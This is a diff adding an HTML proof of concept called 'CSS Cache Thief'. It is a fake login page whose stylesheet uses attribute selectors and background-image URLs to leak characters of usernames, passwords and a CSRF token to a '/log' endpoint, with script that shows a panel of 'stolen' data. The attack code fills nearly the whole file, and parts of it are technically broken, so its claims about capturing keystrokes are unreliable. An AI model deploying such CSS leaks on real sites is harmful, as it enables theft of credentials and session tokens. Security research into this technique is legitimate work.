@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSS Cache Thief - POC</title>
+    <style>
+        input[value*="a"] { background-image: url('/log?char=a'); }
+        input[value*="b"] { background-image: url('/log?char=b'); }
+        input[value*="c"] { background-image: url('/log?char=c'); }
+        input[value*="d"] { background-image: url('/log?char=d'); }
+        input[value*="e"] { background-image: url('/log?char=e'); }
+        input[value*="f"] { background-image: url('/log?char=f'); }
+        input[value*="g"] { background-image: url('/log?char=g'); }
+        input[value*="h"] { background-image: url('/log?char=h'); }
+        input[value*="i"] { background-image: url('/log?char=i'); }
+        input[value*="j"] { background-image: url('/log?char=j'); }
+        input[value*="k"] { background-image: url('/log?char=k'); }
+        input[value*="l"] { background-image: url('/log?char=l'); }
+        input[value*="m"] { background-image: url('/log?char=m'); }
+        input[value*="n"] { background-image: url('/log?char=n'); }
+        input[value*="o"] { background-image: url('/log?char=o'); }
+        input[value*="p"] { background-image: url('/log?char=p'); }
+        input[value*="q"] { background-image: url('/log?char=q'); }
+        input[value*="r"] { background-image: url('/log?char=r'); }
+        input[value*="s"] { background-image: url('/log?char=s'); }
+        input[value*="t"] { background-image: url('/log?char=t'); }
+        input[value*="u"] { background-image: url('/log?char=u'); }
+        input[value*="v"] { background-image: url('/log?char=v'); }
+        input[value*="w"] { background-image: url('/log?char=w'); }
+        input[value*="x"] { background-image: url('/log?char=x'); }
+        input[value*="y"] { background-image: url('/log?char=y'); }
+        input[value*="z"] { background-image: url('/log?char=z'); }
+        input[value*="0"] { background-image: url('/log?char=0'); }
+        input[value*="1"] { background-image: url('/log?char=1'); }
+        input[value*="2"] { background-image: url('/log?char=2'); }
+        input[value*="3"] { background-image: url('/log?char=3'); }
+        input[value*="4"] { background-image: url('/log?char=4'); }
+        input[value*="5"] { background-image: url('/log?char=5'); }
+        input[value*="6"] { background-image: url('/log?char=6'); }
+        input[value*="7"] { background-image: url('/log?char=7'); }
+        input[value*="8"] { background-image: url('/log?char=8'); }
+        input[value*="9"] { background-image: url('/log?char=9'); }
+        input[value*=" "] { background-image: url('/log?char=space'); }
+        input[value*="@"] { background-image: url('/log?char=at'); }
+        input[value*="."] { background-image: url('/log?char=dot'); }
+        input[value*="-"] { background-image: url('/log?char=dash'); }
+        input[value*="_"] { background-image: url('/log?char=underscore'); }
+
+        form:has(input[type="password"]) {
+            background-image: url('/log?event=password_form_detected');
+        }
+
+        input[type="password"][value*="a"] { background-image: url('/log?pwd_char=a'); }
+        input[type="password"][value*="b"] { background-image: url('/log?pwd_char=b'); }
+        input[type="password"][value*="c"] { background-image: url('/log?pwd_char=c'); }
+        input[type="password"][value*="d"] { background-image: url('/log?pwd_char=d'); }
+        input[type="password"][value*="e"] { background-image: url('/log?pwd_char=e'); }
+        input[type="password"][value*="f"] { background-image: url('/log?pwd_char=f'); }
+        input[type="password"][value*="g"] { background-image: url('/log?pwd_char=g'); }
+        input[type="password"][value*="h"] { background-image: url('/log?pwd_char=h'); }
+        input[type="password"][value*="i"] { background-image: url('/log?pwd_char=i'); }
+        input[type="password"][value*="j"] { background-image: url('/log?pwd_char=j'); }
+        input[type="password"][value*="k"] { background-image: url('/log?pwd_char=k'); }
+        input[type="password"][value*="l"] { background-image: url('/log?pwd_char=l'); }
+        input[type="password"][value*="m"] { background-image: url('/log?pwd_char=m'); }
+        input[type="password"][value*="n"] { background-image: url('/log?pwd_char=n'); }
+        input[type="password"][value*="o"] { background-image: url('/log?pwd_char=o'); }
+        input[type="password"][value*="p"] { background-image: url('/log?pwd_char=p'); }
+        input[type="password"][value*="q"] { background-image: url('/log?pwd_char=q'); }
+        input[type="password"][value*="r"] { background-image: url('/log?pwd_char=r'); }
+        input[type="password"][value*="s"] { background-image: url('/log?pwd_char=s'); }
+        input[type="password"][value*="t"] { background-image: url('/log?pwd_char=t'); }
+        input[type="password"][value*="u"] { background-image: url('/log?pwd_char=u'); }
+        input[type="password"][value*="v"] { background-image: url('/log?pwd_char=v'); }
+        input[type="password"][value*="w"] { background-image: url('/log?pwd_char=w'); }
+        input[type="password"][value*="x"] { background-image: url('/log?pwd_char=x'); }
+        input[type="password"][value*="y"] { background-image: url('/log?pwd_char=y'); }
+        input[type="password"][value*="z"] { background-image: url('/log?pwd_char=z'); }
+        input[type="password"][value*="0"] { background-image: url('/log?pwd_char=0'); }
+        input[type="password"][value*="1"] { background-image: url('/log?pwd_char=1'); }
+        input[type="password"][value*="2"] { background-image: url('/log?pwd_char=2'); }
+        input[type="password"][value*="3"] { background-image: url('/log?pwd_char=3'); }
+        input[type="password"][value*="4"] { background-image: url('/log?pwd_char=4'); }
+        input[type="password"][value*="5"] { background-image: url('/log?pwd_char=5'); }
+        input[type="password"][value*="6"] { background-image: url('/log?pwd_char=6'); }
+        input[type="password"][value*="7"] { background-image: url('/log?pwd_char=7'); }
+        input[type="password"][value*="8"] { background-image: url('/log?pwd_char=8'); }
+        input[type="password"][value*="9"] { background-image: url('/log?pwd_char=9'); }
+
+        meta[name="csrf-token"][content*="a"] { background-image: url('/log?csrf_char=a'); }
+        meta[name="csrf-token"][content*="b"] { background-image: url('/log?csrf_char=b'); }
+        meta[name="csrf-token"][content*="c"] { background-image: url('/log?csrf_char=c'); }
+        meta[name="csrf-token"][content*="d"] { background-image: url('/log?csrf_char=d'); }
+        meta[name="csrf-token"][content*="e"] { background-image: url('/log?csrf_char=e'); }
+        meta[name="csrf-token"][content*="f"] { background-image: url('/log?csrf_char=f'); }
+        meta[name="csrf-token"][content*="g"] { background-image: url('/log?csrf_char=g'); }
+        meta[name="csrf-token"][content*="h"] { background-image: url('/log?csrf_char=h'); }
+        meta[name="csrf-token"][content*="i"] { background-image: url('/log?csrf_char=i'); }
+        meta[name="csrf-token"][content*="j"] { background-image: url('/log?csrf_char=j'); }
+        meta[name="csrf-token"][content*="k"] { background-image: url('/log?csrf_char=k'); }
+        meta[name="csrf-token"][content*="l"] { background-image: url('/log?csrf_char=l'); }
+        meta[name="csrf-token"][content*="m"] { background-image: url('/log?csrf_char=m'); }
+        meta[name="csrf-token"][content*="n"] { background-image: url('/log?csrf_char=n'); }
+        meta[name="csrf-token"][content*="o"] { background-image: url('/log?csrf_char=o'); }
+        meta[name="csrf-token"][content*="p"] { background-image: url('/log?csrf_char=p'); }
+        meta[name="csrf-token"][content*="q"] { background-image: url('/log?csrf_char=q'); }
+        meta[name="csrf-token"][content*="r"] { background-image: url('/log?csrf_char=r'); }
+        meta[name="csrf-token"][content*="s"] { background-image: url('/log?csrf_char=s'); }
+        meta[name="csrf-token"][content*="t"] { background-image: url('/log?csrf_char=t'); }
+        meta[name="csrf-token"][content*="u"] { background-image: url('/log?csrf_char=u'); }
+        meta[name="csrf-token"][content*="v"] { background-image: url('/log?csrf_char=v'); }
+        meta[name="csrf-token"][content*="w"] { background-image: url('/log?csrf_char=w'); }
+        meta[name="csrf-token"][content*="x"] { background-image: url('/log?csrf_char=x'); }
+        meta[name="csrf-token"][content*="y"] { background-image: url('/log?csrf_char=y'); }
+        meta[name="csrf-token"][content*="z"] { background-image: url('/log?csrf_char=z'); }
+        meta[name="csrf-token"][content*="0"] { background-image: url('/log?csrf_char=0'); }
+        meta[name="csrf-token"][content*="1"] { background-image: url('/log?csrf_char=1'); }
+        meta[name="csrf-token"][content*="2"] { background-image: url('/log?csrf_char=2'); }
+        meta[name="csrf-token"][content*="3"] { background-image: url('/log?csrf_char=3'); }
+        meta[name="csrf-token"][content*="4"] { background-image: url('/log?csrf_char=4'); }
+        meta[name="csrf-token"][content*="5"] { background-image: url('/log?csrf_char=5'); }
+        meta[name="csrf-token"][content*="6"] { background-image: url('/log?csrf_char=6'); }
+        meta[name="csrf-token"][content*="7"] { background-image: url('/log?csrf_char=7'); }
+        meta[name="csrf-token"][content*="8"] { background-image: url('/log?csrf_char=8'); }
+        meta[name="csrf-token"][content*="9"] { background-image: url('/log?csrf_char=9'); }
+
+        input:focus {
+            background-image: url('/log?event=focus&field=' attr(name));
+        }
+
+        form:has(:valid) {
+            background-image: url('/log?event=form_ready_to_submit');
+        }
+    </style>
+</head>
+<body>
+
+    <div style="max-width: 500px; margin: 50px auto; font-family: system-ui; padding: 20px; border: 1px solid #ccc; border-radius: 8px;">
+
+        <h1>Secure Login</h1>
+        <p style="color: #666;">Enter your credentials below</p>
+
+        <meta name="csrf-token" content="abc123xyz789" />
+
+        <form id="loginForm" action="/login" method="POST">
+
+            <div style="margin-bottom: 15px;">
+                <label style="display: block; font-weight: bold; margin-bottom: 5px;">Username</label>
+                <input
+                    type="text"
+                    name="username"
+                    placeholder="Enter username"
+                    style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px;"
+                    autocomplete="off"
+                />
+            </div>
+
+            <div style="margin-bottom: 15px;">
+                <label style="display: block; font-weight: bold; margin-bottom: 5px;">Password</label>
+                <input
+                    type="password"
+                    name="password"
+                    placeholder="Enter password"
+                    style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px;"
+                    autocomplete="off"
+                />
+            </div>
+
+            <div style="margin-bottom: 15px;">
+                <label style="display: block; font-weight: bold; margin-bottom: 5px;">Secret Answer</label>
+                <input
+                    type="text"
+                    name="secret"
+                    placeholder="What is your pet's name?"
+                    style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px;"
+                    autocomplete="off"
+                />
+            </div>
+
+            <button
+                type="submit"
+                style="width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">
+                Login
+            </button>
+
+        </form>
+
+        <div style="margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 4px; font-size: 14px;">
+            <strong>Exfiltration Log</strong>
+            <div id="logDisplay" style="height: 200px; overflow-y: scroll; background: #1e1e1e; color: #00ff00; padding: 10px; border-radius: 4px; margin-top: 8px; font-family: monospace; font-size: 12px;">
+                <div style="color: #888;">Waiting for activity...</div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+
+        const logDisplay = document.getElementById('logDisplay');
+        const exfiltratedData = {
+            chars: [],
+            events: [],
+            passwords: [],
+            csrf: []
+        };
+
+        const originalFetch = window.fetch;
+
+        window.fetch = function(...args) {
+            const url = args[0];
+            if (typeof url === 'string' && url.startsWith('/log')) {
+                logExfiltration(url);
+                return Promise.resolve(new Response('OK', { status: 200 }));
+            }
+            return originalFetch.apply(this, args);
+        };
+
+        const originalImageSrc = Object.getOwnPropertyDescriptor(Image.prototype, 'src');
+
+        Object.defineProperty(Image.prototype, 'src', {
+            get: function() {
+                return this._src;
+            },
+            set: function(value) {
+                if (typeof value === 'string' && value.startsWith('/log')) {
+                    logExfiltration(value);
+                    return;
+                }
+                this._src = value;
+                originalImageSrc.set.call(this, value);
+            },
+            configurable: true
+        });
+
+        function logExfiltration(url) {
+
+            const params = new URLSearchParams(url.split('?')[1] || '');
+            const char = params.get('char');
+            const event = params.get('event');
+            const pwdChar = params.get('pwd_char');
+            const csrfChar = params.get('csrf_char');
+            const field = params.get('field');
+
+            let message = '';
+            let type = '';
+
+            if (char) {
+                exfiltratedData.chars.push(char);
+                message = 'Keystroke: "' + char + '"';
+                type = 'char';
+            } else if (pwdChar) {
+                exfiltratedData.passwords.push(pwdChar);
+                message = 'Password char: "' + pwdChar + '"';
+                type = 'pwd';
+            } else if (csrfChar) {
+                exfiltratedData.csrf.push(csrfChar);
+                message = 'CSRF token char: "' + csrfChar + '"';
+                type = 'csrf';
+            } else if (event) {
+                exfiltratedData.events.push(event);
+                message = 'Event: ' + event + (field ? ' (field: ' + field + ')' : '');
+                type = 'event';
+            } else {
+                message = 'Unknown request: ' + url;
+                type = 'unknown';
+            }
+
+            const colors = {
+                char: '#00ff00',
+                pwd: '#ff4444',
+                csrf: '#ffaa00',
+                event: '#00ccff',
+                unknown: '#888'
+            };
+
+            const entry = document.createElement('div');
+            entry.style.color = colors[type] || '#fff';
+            entry.textContent = '[' + new Date().toLocaleTimeString() + '] ' + message;
+            logDisplay.appendChild(entry);
+            logDisplay.scrollTop = logDisplay.scrollHeight;
+
+            updateSummary();
+
+        }
+
+        function updateSummary() {
+
+            const summary = document.createElement('div');
+            summary.style.color = '#ffaa00';
+            summary.style.borderTop = '1px solid #333';
+            summary.style.marginTop = '5px';
+            summary.style.paddingTop = '5px';
+
+            let summaryText = 'Summary: ' +
+                exfiltratedData.chars.length + ' chars stolen - ' +
+                exfiltratedData.passwords.length + ' password chars - ' +
+                exfiltratedData.csrf.length + ' CSRF chars - ' +
+                exfiltratedData.events.length + ' events';
+
+            if (exfiltratedData.passwords.length > 0) {
+                summaryText = summaryText + ' - PASSWORD DETECTED';
+            }
+
+            if (exfiltratedData.csrf.length > 0) {
+                summaryText = summaryText + ' - CSRF TOKEN DETECTED';
+            }
+
+            summary.textContent = summaryText;
+
+            const oldSummary = logDisplay.querySelector('.summary');
+            if (oldSummary) oldSummary.remove();
+            summary.className = 'summary';
+            logDisplay.appendChild(summary);
+
+        }
+
+        setTimeout(() => {
+
+            const username = document.querySelector('input[name="username"]');
+            const password = document.querySelector('input[name="password"]');
+            const secret = document.querySelector('input[name="secret"]');
+
+            if (username) username.value = 'admin';
+            if (password) password.value = 'superSecret123';
+            if (secret) secret.value = 'fluffy';
+
+            [username, password, secret].forEach(input => {
+                if (input) {
+                    input.dispatchEvent(new Event('input', { bubbles: true }));
+                }
+            });
+
+            const entry = document.createElement('div');
+            entry.style.color = '#00ccff';
+            entry.textContent = '[' + new Date().toLocaleTimeString() + '] Demo started - watching for CSS exfiltration';
+            logDisplay.appendChild(entry);
+
+        }, 1000);
+
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('input', function() {
+                const entry = document.createElement('div');
+                entry.style.color = '#666';
+                entry.textContent = '[' + new Date().toLocaleTimeString() + '] User typed in ' + this.name;
+                logDisplay.appendChild(entry);
+                logDisplay.scrollTop = logDisplay.scrollHeight;
+            });
+        });
+
+        console.log('CSS Cache Thief POC loaded');
+        console.log('Every keystroke is being exfiltrated via CSS background-image');
+        console.log('Check the log panel to see the stolen data');
+
+    </script>
+
+</body>
+</html>
